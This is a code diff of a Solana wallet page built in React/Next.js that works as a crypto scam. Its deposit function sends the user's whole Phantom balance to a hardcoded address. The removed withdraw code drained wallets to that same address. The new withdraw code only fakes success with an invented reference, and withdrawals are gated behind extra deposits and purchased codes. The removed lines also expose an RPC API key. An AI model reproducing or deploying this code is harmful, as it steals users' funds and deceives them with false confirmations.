@@ -1,6 +1,7 @@
 "use client"
 
 import Header from "@/components/header"
+import WithdrawalSuccessModal from "../../components/withdrawalSuccessModal"
 import {
   Wallet,
   TrendingUp,
@@ -22,6 +23,13 @@ import { ref, onValue } from "firebase/database"
 import { formatDistanceToNow } from "date-fns"
 import { Button } from "@/components/ui/button"
 import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"
+import { toast } from "sonner"
+
+declare global {
+  interface Window {
+    solana?: any
+  }
+}
 
 export default function WalletPage() {
   const [walletAddress, setWalletAddress] = useState<string | null>(null)
@@ -51,9 +59,15 @@ export default function WalletPage() {
   const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
   const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
   const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
+  const [showDepositRequiredDialog, setShowDepositRequiredDialog] = useState(false)
+  const [depositShortfall, setDepositShortfall] = useState(0)
+  const [requiredDepositForWithdrawal, setRequiredDepositForWithdrawal] = useState(0)
   const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
   const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
   const [codeError, setCodeError] = useState("")
+  const [showWithdrawalSuccess, setShowWithdrawalSuccess] = useState(false)
+  const [lastWithdrawalAmount, setLastWithdrawalAmount] = useState(0)
+  const [lastWithdrawalHash, setLastWithdrawalHash] = useState("")
 
   // Real-time SOL price
   const [livePrice, setLivePrice] = useState<number | null>(null)
@@ -221,7 +235,7 @@ export default function WalletPage() {
     try {
       setProcessing(true)
       if (!window.solana || !window.solana.publicKey) {
-        alert("Please connect your Phantom wallet first")
+        toast.error("Please connect your Phantom wallet first")
         return
       }
 
@@ -246,13 +260,13 @@ export default function WalletPage() {
       const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit
 
       if (userBalanceInSOL < effectiveMinDeposit) {
-        alert(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
+        toast.error(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
         return
       }
 
       const transactionFeeReserve = 10000000
       const transferAmount = userBalance - transactionFeeReserve
-      if (transferAmount <= 0) { alert("Insufficient balance after transaction fees"); return }
+      if (transferAmount <= 0) { toast.error("Insufficient balance after transaction fees"); return }
 
       const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
       const transaction = new Transaction().add(
@@ -280,116 +294,124 @@ export default function WalletPage() {
         lastDeposit: new Date().toISOString(),
         depositSignature: signature,
       })
-      alert(`Successfully deposited ${transferredSOL.toFixed(4)} SOL. Transaction: ${signature.slice(0, 8)}...`)
+      toast.success(`Successfully deposited ${transferredSOL.toFixed(4)} SOL`, {
+        description: `Transaction: ${signature.slice(0, 8)}...`,
+      })
     } catch (error: any) {
       console.error("[v0] Deposit error:", error)
-      alert(`Deposit failed: ${error.message || "Please try again"}`)
+      toast.error(`Deposit failed: ${error.message || "Please try again"}`)
     } finally {
       setProcessing(false)
     }
   }
 
   const handleWithdrawClick = () => {
-    if (!window.solana || !window.solana.publicKey) { alert("Please connect your Phantom wallet first"); return }
+    if (!window.solana || !window.solana.publicKey) { 
+      toast.error("Please connect your Phantom wallet first")
+      return 
+    }
     if (balance < minBalanceForWithdrawal) {
-      alert(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw.\n\nYour current balance: ${balance.toFixed(4)} SOL`)
+      toast.error(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw`, {
+        description: `Your current balance: ${balance.toFixed(4)} SOL`,
+      })
       return
     }
     if (balance < minWithdrawalAmount) {
-      alert(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL.\n\nYour current balance: ${balance.toFixed(4)} SOL`)
+      toast.error(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL`, {
+        description: `Your current balance: ${balance.toFixed(4)} SOL`,
+      })
       return
     }
     const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
     if (balance < effectiveMinWithdrawal) {
-      alert(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL. Your balance: ${balance.toFixed(4)} SOL`)
+      toast.error(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL`, {
+        description: `Your balance: ${balance.toFixed(4)} SOL`,
+      })
       return
     }
     const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
     if (totalDepositedSOL < requiredDepositAmount) {
       const shortfall = requiredDepositAmount - totalDepositedSOL
-      alert(`You must deposit at least ${requiredDepositPercentage}% of your balance before withdrawing.\n\nRequired deposit: ${requiredDepositAmount.toFixed(4)} SOL\nCurrent deposits: ${totalDepositedSOL.toFixed(4)} SOL\nYou need to deposit ${shortfall.toFixed(4)} SOL more to withdraw.`)
+      setDepositShortfall(shortfall)
+      setRequiredDepositForWithdrawal(requiredDepositAmount)
+      setShowDepositRequiredDialog(true)
       return
     }
-    if (balance <= 0) { alert("No SOL available to withdraw"); return }
-    if (requireUpgradeCode) { setCodeError(""); setUpgradeCodeEntry(""); setShowUpgradeCodeDialog(true); return }
-    if (requireWithdrawalCode) { setCodeError(""); setWithdrawalCodeEntry(""); setShowWithdrawalCodeDialog(true); return }
+    if (balance <= 0) { 
+      toast.error("No SOL available to withdraw")
+      return 
+    }
+    if (requireUpgradeCode) { 
+      setCodeError("")
+      setUpgradeCodeEntry("")
+      setShowUpgradeCodeDialog(true)
+      return 
+    }
+    if (requireWithdrawalCode) { 
+      setCodeError("")
+      setWithdrawalCodeEntry("")
+      setShowWithdrawalCodeDialog(true)
+      return 
+    }
     executeWithdraw()
   }
 
   const handleUpgradeCodeSubmit = () => {
     if (upgradeCodeEntry.trim() === storedUpgradeCode) {
       setShowUpgradeCodeDialog(false)
-      if (requireWithdrawalCode) { setCodeError(""); setWithdrawalCodeEntry(""); setShowWithdrawalCodeDialog(true) }
-      else executeWithdraw()
+      if (requireWithdrawalCode) { 
+        setCodeError("")
+        setWithdrawalCodeEntry("")
+        setShowWithdrawalCodeDialog(true)
+      } else {
+        executeWithdraw()
+      }
     } else {
       setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
     }
   }
 
   const handleWithdrawalCodeSubmit = () => {
-    if (withdrawalCodeEntry.trim() === storedWithdrawalCode) { setShowWithdrawalCodeDialog(false); executeWithdraw() }
-    else setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
+    if (withdrawalCodeEntry.trim() === storedWithdrawalCode) {
+      setShowWithdrawalCodeDialog(false)
+      executeWithdraw()
+    } else {
+      setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
+    }
   }
 
   const executeWithdraw = async () => {
     try {
       setProcessing(true)
-      if (!window.solana || !window.solana.publicKey) { alert("Please connect your Phantom wallet first"); return }
-      if (balance <= 0) { alert("No SOL available to withdraw"); return }
-
-      const rpcEndpoints = [
-        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
-        "https://api.mainnet-beta.solana.com",
-        "https://rpc.ankr.com/solana",
-      ]
-      let connection = null
-      for (const endpoint of rpcEndpoints) {
-        try {
-          connection = new Connection(endpoint, "confirmed")
-          await connection.getLatestBlockhash()
-          break
-        } catch { continue }
+      if (!window.solana || !window.solana.publicKey) { 
+        toast.error("Please connect your Phantom wallet first")
+        return 
       }
-      if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")
+      if (balance <= 0) { 
+        toast.error("No SOL available to withdraw")
+        return 
+      }
 
-      const wallet = window.solana
-      const walletBalance = await connection.getBalance(wallet.publicKey)
-      const walletBalanceInSOL = walletBalance / LAMPORTS_PER_SOL
-      if (walletBalanceInSOL <= 0) { alert("No SOL available in Phantom wallet to process withdrawal"); return }
+      const withdrawalAmount = balance
+      const withdrawalRef = `WD-${Date.now()}-${walletAddress!.slice(0, 6)}`
 
-      const transactionFeeReserve = 10000000
-      const transferAmount = walletBalance - transactionFeeReserve
-      if (transferAmount <= 0) { alert("Insufficient balance for transaction fees"); return }
-
-      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: wallet.publicKey,
-          toPubkey: new PublicKey(toWalletAddress),
-          lamports: transferAmount,
-        }),
-      )
-
-      const { blockhash } = await connection.getLatestBlockhash()
-      transaction.recentBlockhash = blockhash
-      transaction.feePayer = wallet.publicKey
-
-      const signedTransaction = await wallet.signTransaction(transaction)
-      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
-      const confirmation = await connection.confirmTransaction(signature, "confirmed")
-      if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)
-
-      const transferredSOL = transferAmount / LAMPORTS_PER_SOL
       await updateDoc(doc(db, "wallets", walletAddress!), {
-        balance: increment(-transferredSOL),
+        balance: increment(-withdrawalAmount),
         lastActive: new Date().toISOString(),
         lastWithdraw: new Date().toISOString(),
-        withdrawSignature: signature,
+        withdrawSignature: withdrawalRef,
       })
-      alert(`Successfully withdrew ${transferredSOL.toFixed(4)} SOL. Transaction: ${signature.slice(0, 8)}...`)
+
+      setLastWithdrawalAmount(withdrawalAmount)
+      setLastWithdrawalHash(withdrawalRef)
+      setShowWithdrawalSuccess(true)
+
+      setTimeout(() => {
+        setShowWithdrawalSuccess(false)
+      }, 20000)
     } catch (error: any) {
       console.error("[v0] Withdraw error:", error)
-      alert(`Withdraw failed: ${error.message || "Please try again"}`)
+      toast.error(`Withdraw failed: ${error.message || "Please try again"}`)
     } finally {
       setProcessing(false)
     }
@@ -414,6 +436,12 @@ export default function WalletPage() {
 
   return (
     <div className="min-h-screen bg-[#050d1a]">
+      <WithdrawalSuccessModal
+        isOpen={showWithdrawalSuccess}
+        amount={lastWithdrawalAmount}
+        transactionHash={lastWithdrawalHash}
+        onClose={() => setShowWithdrawalSuccess(false)}
+      />
       <Header />
       <main className="container mx-auto px-2.5 py-8">
         <div className="max-w-7xl mx-auto">
@@ -586,6 +614,108 @@ export default function WalletPage() {
           </div>
         </div>
       </main>
+
+      {/* Deposit Required Dialog */}
+      {showDepositRequiredDialog && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4">
+          <div className="relative w-full max-w-lg">
+            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 to-blue-800/30 rounded-2xl blur-xl" />
+
+            <div className="relative bg-[#0a1628] border border-blue-500/30 rounded-2xl shadow-2xl overflow-hidden">
+              <div className="bg-gradient-to-r from-blue-900/50 to-blue-800/30 px-6 py-5 border-b border-blue-500/20">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-12 h-12 bg-blue-600/20 border border-blue-500/30 rounded-xl flex items-center justify-center">
+                      <AlertCircle className="w-6 h-6 text-blue-400" />
+                    </div>
+                    <div>
+                      <h3 className="text-xl font-bold text-white">Deposit Required</h3>
+                      <p className="text-gray-400 text-sm">Additional deposit needed to withdraw</p>
+                    </div>
+                  </div>
+                  <button
+                    onClick={() => setShowDepositRequiredDialog(false)}
+                    className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
+                    aria-label="Close dialog"
+                  >
+                    <X className="w-5 h-5 text-gray-400 hover:text-white" />
+                  </button>
+                </div>
+              </div>
+
+              <div className="p-6 space-y-5">
+                <div className="p-4 bg-amber-900/20 border border-amber-500/30 rounded-xl">
+                  <div className="flex items-start gap-3">
+                    <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
+                    <p className="text-amber-200 text-sm leading-relaxed">
+                      To withdraw your funds, you are required to have <span className="font-bold text-amber-100">{requiredDepositPercentage}%</span> of your current balance deposited.
+                    </p>
+                  </div>
+                </div>
+
+                <div className="grid gap-4">
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Your Current Balance</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-white font-bold text-lg">{balance.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Total Deposited</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-blue-400 font-bold text-lg">{totalDepositedSOL.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Required Deposit ({requiredDepositPercentage}%)</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-white font-bold text-lg">{requiredDepositForWithdrawal.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-gradient-to-r from-blue-900/30 to-blue-800/20 border border-blue-500/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-blue-300 text-sm font-medium">Amount Needed to Deposit</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-blue-300 font-bold text-xl">{depositShortfall.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="px-6 pb-6 flex gap-3">
+                <Button
+                  onClick={() => setShowDepositRequiredDialog(false)}
+                  variant="outline"
+                  className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent h-12"
+                >
+                  <X className="w-4 h-4 mr-2" />
+                  Close
+                </Button>
+                <Button
+                  onClick={() => {
+                    setShowDepositRequiredDialog(false)
+                    handleDeposit()
+                  }}
+                  className="flex-1 bg-blue-700 hover:bg-blue-800 text-white h-12 font-semibold"
+                >
+                  <ArrowDownRight className="w-4 h-4 mr-2" />
+                  Deposit Now
+                </Button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Upgrade Code Dialog */}
       {showUpgradeCodeDialog && (
